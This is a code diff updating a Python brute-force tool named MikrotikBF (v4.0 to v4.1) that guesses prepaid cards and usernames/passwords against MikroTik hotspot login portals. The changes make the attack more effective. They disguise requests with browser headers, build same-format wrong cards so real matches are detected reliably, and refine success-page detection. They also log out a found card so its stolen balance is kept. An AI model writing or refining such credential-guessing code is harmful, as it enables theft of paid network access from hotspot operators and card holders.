@@ -209,6 +209,15 @@ def char_set(title):
 _tls = threading.local()
 
 
+def browser_session():
+    """v4.1: one-off session carrying the browser-like headers (the
+    diagnostic/quick flows used bare sessions, so the portal saw
+    'python-requests' as the User-Agent there)."""
+    s = requests.Session()
+    s.headers.update(HEADERS)
+    return s
+
+
 def thread_session():
     s = getattr(_tls, 'session', None)
     if s is None:
@@ -420,7 +429,8 @@ def learn_success_page(p):
    cannot learn. Falling back to /status and the keyword.{white}''')
         return False
 
-    p['success_url'] = ok_resp.url or ''
+    p['success_url'] = _useful_success_url(ok_resp.url or '',
+                                           p.get('login_url'))
     if sig:
         p['success_signature'] = sig
         print(f'\n {green}* Learned! Signature words:{white} '
@@ -751,6 +761,72 @@ def space_line(p, walk=None, space=None, sent=None):
         txt += f'  |  this run: {fmt_int(sent)} distinct'
     return txt
 
+def _probe_pair(p):
+    """v4.1: two dummy (user, password) pairs in EXACTLY the same format as
+    the guessed cards. The failure baseline must come from the page the
+    portal shows for a genuine-looking (but wrong) card. The old 8-char
+    random probe received the portal's *format-error* page on card-based
+    networks, so every format-valid wrong card then looked "DIFFERENT" and
+    stopped the run as a false SUSPECTED MATCH (verified 2026-09-21)."""
+    nt = p.get('network_type')
+    for _ in range(8):
+        if nt in ('1', '2'):
+            v1 = ''.join(choices(p['charset'], k=int(p['var_len'])))
+            v2 = ''.join(choices(p['charset'], k=int(p['var_len'])))
+            if v1 != v2:
+                c1 = p['prefix'] + v1 + p['suffix']
+                c2 = p['prefix'] + v2 + p['suffix']
+                return (c1, c1), (c2, c2)
+        else:
+            u1 = (p.get('u_prefix', '')
+                  + ''.join(choices(p['u_charset'], k=int(p['u_len'])))
+                  + p.get('u_suffix', ''))
+            u2 = (p.get('u_prefix', '')
+                  + ''.join(choices(p['u_charset'], k=int(p['u_len'])))
+                  + p.get('u_suffix', ''))
+            w1 = (p.get('p_prefix', '')
+                  + ''.join(choices(p['p_charset'], k=int(p['p_len'])))
+                  + p.get('p_suffix', ''))
+            w2 = (p.get('p_prefix', '')
+                  + ''.join(choices(p['p_charset'], k=int(p['p_len'])))
+                  + p.get('p_suffix', ''))
+            if (u1, w1) != (u2, w2):
+                return (u1, w1), (u2, w2)
+    # degenerate space - fall back to the old random strings
+    z1 = ''.join(choices('zqx9', k=8))
+    z2 = ''.join(choices('zqx9', k=8))
+    return (z1, z1), (z2, z2)
+
+
+def _near_miss(card):
+    """v4.1: a same-format card that is (almost certainly) wrong - the last
+    digit is rotated (last char replaced otherwise). This makes the
+    SELF-TEST compare against the portal's *auth-failed* page instead of
+    its format-error page, so the passing modes can be told apart."""
+    if not card.strip('0'):
+        return '1' * len(card)
+    last = card[-1]
+    if last.isdigit():
+        repl = '9' if last == '9' else str(int(last) + 1)
+    else:
+        repl = 'z' if last != 'z' else 'y'
+    return card[:-1] + repl
+
+
+def _useful_success_url(url, login_url):
+    """v4.1: a success_url identical to the login URL marks EVERY reply at
+    the login page as a success (same_path check in is_successful) - a
+    false-positive trap for portals that answer 200 in place (no redirect).
+    Those portals must rely on the learned signature / keyword instead."""
+    if not url:
+        return ''
+    a, b = urlparse(url), urlparse(login_url or '')
+    if (a.netloc.lower(), a.path, a.query) == (
+            b.netloc.lower(), b.path, b.query):
+        return ''
+    return url
+
+
 def attack(p, count, threads_count, keyword):
     lock = threading.Lock()
     stop_event = threading.Event()
@@ -822,14 +898,15 @@ def attack(p, count, threads_count, keyword):
         # failure page is static and we can compare attempts by exact content
         # (sha256) instead of the old +/-40 length tolerance - which swallowed
         # success pages that were only a few bytes off the failure page.
-        wz = ''.join(choices('zqx9', k=8))
-        w = send_login(p, wz, wz, retry_stale=False)
-        wz2 = ''.join(choices('zqx9', k=8))
-        w2 = send_login(p, wz2, wz2, retry_stale=False)
+        # v4.1: the probes are SAME-FORMAT dummy cards (see _probe_pair) so
+        # the baseline is the auth-failed page, not the format-error page.
+        pz1, pz2 = _probe_pair(p)
+        w = send_login(p, pz1[0], pz1[1], retry_stale=False)
+        w2 = send_login(p, pz2[0], pz2[1], retry_stale=False)
         wrong_d = {'status': w.status_code, 'len': len(w.text or ''),
                    'blocked': _looks_blocked(w.text or '')}
-        n1 = _normalize_page(w.text or '', (wz, wz))
-        n2 = _normalize_page(w2.text or '', (wz2, wz2))
+        n1 = _normalize_page(w.text or '', pz1)
+        n2 = _normalize_page(w2.text or '', pz2)
         if n1 == n2:
             wrong_sha = hashlib.sha256(
                 n1.encode('utf-8', 'replace')).hexdigest()
@@ -1391,8 +1468,14 @@ def verify_flow():
                                     wrong_d['text'] if wrong_d else '')
             if sig:
                 prof['success_signature'] = sig
-            if learn_src['url']:
-                prof['success_url'] = learn_src['url']
+            su = _useful_success_url(learn_src['url'] or '',
+                                     prof.get('login_url'))
+            if su:
+                prof['success_url'] = su
+            elif learn_src['url']:
+                print(f' {yellow}! Success reply came from the login URL '\
+                      f'itself (200, no redirect) - keeping detection on '\
+                      f'the learned signature only.{white}')
             if save_db(db):
                 print(f' {green}* Saved: '
                       f'method={"POST" if learn_src["method"] == "2" else "GET"}, '
@@ -1925,7 +2008,7 @@ def diagnose_flow():
     if not card:
         print(f'{red} * Nothing entered.{white}')
         return
-    s = requests.Session()
+    s = browser_session()
     try:
         r = s.get(url, timeout=(CONNECT_TIMEOUT, READ_TIMEOUT), verify=False,
                   allow_redirects=True)
@@ -1972,7 +2055,9 @@ def diagnose_flow():
               'success_url_contains': 'msftconnecttest.com'}
     pass_modes = [('same', 'same as card'), ('empty', 'empty'),
                   ('md5user', 'md5(username)'), ('omit', 'field omitted')]
-    wrong = '0' * len(card) if card.strip('0') else '1' * len(card)
+    # v4.1: same-format near-miss (all zeros got the portal's format-error
+    # page, which made every pass mode look "accepted")
+    wrong = _near_miss(card)
     results = []
     likely = []
     for pm, label in pass_modes:
@@ -1980,7 +2065,7 @@ def diagnose_flow():
             p = dict(p_base)
             p['pass_mode'] = pm
             p['dst_value'] = dst
-            s1 = requests.Session()
+            s1 = browser_session()
             _warm_session(s1, p)
             tmo = (CONNECT_TIMEOUT, READ_TIMEOUT)
             try:
@@ -2055,7 +2140,7 @@ def send_logout(p, url=None, session=None):
     has <form action=".../logout">) so a card that was just used for a test
     or a found match gets released and its balance preserved."""
     lo = url or p.get('logout_url') or urljoin(p['login_url'], '/logout')
-    s = session or requests.Session()
+    s = session or browser_session()
     try:
         return s.post(lo, data={}, timeout=(CONNECT_TIMEOUT, READ_TIMEOUT),
                       verify=False, allow_redirects=False)
@@ -2091,7 +2176,7 @@ def quick_mode_flow():
         return
 
     print(f'\n {yellow}> Reading the login page...{white}')
-    s = requests.Session()
+    s = browser_session()
     try:
         r = s.get(p['login_url'], timeout=(CONNECT_TIMEOUT, READ_TIMEOUT),
                   verify=False, allow_redirects=True)
@@ -2133,14 +2218,14 @@ def quick_mode_flow():
 
     print(f' {yellow}> Tuning with the known card (a few seconds)...{white}')
     tmo = (CONNECT_TIMEOUT, READ_TIMEOUT)
-    wrong = '0' * len(card) if card.strip('0') else '1' * len(card)
+    wrong = _near_miss(card)  # v4.1: same-format near-miss, see above
     chosen = None
     for pm in ('same', 'empty', 'md5user', 'omit'):
         for dst in dsts:
             p2 = dict(p)
             p2['pass_mode'] = pm
             p2['dst_value'] = dst
-            s1 = requests.Session()
+            s1 = browser_session()
             _warm_session(s1, p2)
             try:
                 resp = _raw_send(s1, p2, card, card, tmo)
@@ -2179,7 +2264,8 @@ def quick_mode_flow():
     else:
         print(f' {yellow}! Could not extract signature words - the tool will '
               f'rely on the page-difference detection (still works).{white}')
-    p['success_url'] = ok_resp.url or ''
+    p['success_url'] = _useful_success_url(ok_resp.url or '',
+                                           p.get('login_url'))
     m = re.search(r'<form[^>]+action=["\']?([^"\' >]*logout[^"\' >]*)',
                   ok_resp.text or '', re.I)
     p['logout_url'] = urljoin(ok_resp.url or page_url, m.group(1)) \
@@ -2226,7 +2312,7 @@ def main():
     clear_screen()
     print(f'''{green}
   =============================================
-{white}   MikrotikBF v4.0
+{white}   MikrotikBF v4.1
 {white}   Developer : ENG.YOUSEF
 {green}  ============================================={gray}{green}
 ''')
